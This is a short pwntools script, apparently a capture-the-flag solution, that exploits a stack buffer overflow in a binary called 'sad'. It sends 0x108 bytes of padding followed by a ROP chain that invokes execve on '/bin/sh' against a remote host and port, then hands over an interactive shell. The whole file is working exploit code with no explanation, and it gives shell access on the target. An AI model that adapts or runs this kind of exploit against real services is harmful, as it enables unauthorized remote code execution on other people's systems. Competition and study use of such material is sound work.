from pwn import *

elf = ELF('./sad')

payload = 'A'*0x108+p64(0x43f8d7)+p64(0x3b)+p64(0x40187a)+p64(elf.search('/bin/sh').next())+p64(0x407aae)+p64(0)+p64(0x40177f)+p64(0)+p64(0x40120f)

p = remote('jh2i.com', 50002)
print p.recv()
p.sendline(payload)
p.interactive()
